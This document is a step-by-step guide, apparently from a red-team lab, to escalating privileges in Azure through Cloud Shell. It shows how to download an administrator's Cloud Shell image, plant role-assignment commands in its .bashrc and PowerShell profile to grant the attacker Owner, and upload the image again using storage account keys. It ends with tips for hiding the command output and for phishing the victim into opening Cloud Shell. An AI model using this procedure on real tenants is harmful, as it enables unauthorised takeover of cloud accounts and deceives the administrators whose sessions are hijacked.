# Privilege Escalation using the Cloud Shell Account

## Steps

#### 1) Authenticate with the contributor account

    az login -u CONTRIBUTOR_USER@DOMAIN.LOCAL -p PASSWORD 

#### 2) Run Lava

    python3 lava.py

#### 3) Verify the current user and permissions

    Lava $> exec priv_show 

#### 4) Scan the file shares in the Azure subscription for potential Cloud Shell images

    Lava $> exec stg_file_scan 

#### 5) Downloads the file into a temporary directory. Make note of the download location

    Lava $> exec stg_file_download 

#### 6) Exit Lava

    exit

#### 7) Mount the downloaded image file

    mount DOWNLOAD_LOCATION/.cloudconsole/acc_azureadmin.img /mnt 

#### 8) Explore the mounted drive with this command, then press tab

    ls /mnt/ 

#### 9) Change directory to the mounted drive

    cd /mnt 

#### 10) Append a malicious command to the .bashrc file to escalate the privileges of our current user

    echo "az role assignment create --role "Owner" --assignee $(az ad user list --display-name contributoruser | jq '.[]' | jq -r '.userPrincipalName')" >> .bashrc 

### To do the same for a Powershell session we can do:

#### 1) 

    mkdir .config

    mkdir .config/PowerShell

    echo "New-AzRoleAssignment -UserPrincipalName (Get-AzADUser -StartsWith contributoruser).UserPrincipalName -RoleDefinitionName Owner" >> .config/PowerShell/Microsoft.PowerShell_profile.ps1 (Same trick as Linux)

    cd ..

#### 2) Unmount the drive from your session

    umount /mnt 

#### 3) Enumerate the storage accounts

    az storage account list --query [].name -o tsv 

#### 4) Store the target storage account in a variable

    storagename=STORAGE_ACCT_NAME 

#### 5) Obtain the access key

    key=$(az storage account keys list -n $storagename --query [0].value -o tsv) 

#### 6) Obtain the file share

    csfileshare=$(az storage share list --account-key $key --account-name $storagename --query [].name -o tsv) 

#### 7) Upload the image back to it

    az storage file upload --account-key $key --account-name $storagename --share-name $csfileshare --path ".cloudconsole/acc_azureadmin.img" --source "DOWNLOAD_LOCATION/.cloudconsole/acc_azureadmin.img" 

#### 8) Trigger the attack by opening a Cloud Shell instance as an administrator (Or wait for someone to trigger it)

#### 9) After triggering, execute: 

    python3 lava.py

#### 10) Verify the attack worked

    exec priv_show 

## TIP: For a stealthier action from our attacks, we can use: | out-null function at the end of the Powershell command OR &> /dev/null at the end of the Bash shell attack.

### In a practical attack scenario, it may take a while for a victim Cloud Shell account to open a new session. To expedite this process, you could send a phishing email that links to https://shell.azure.com/. Not only will the link look legitimate, but it will start up a Cloud Shell session as soon as the site is loaded.



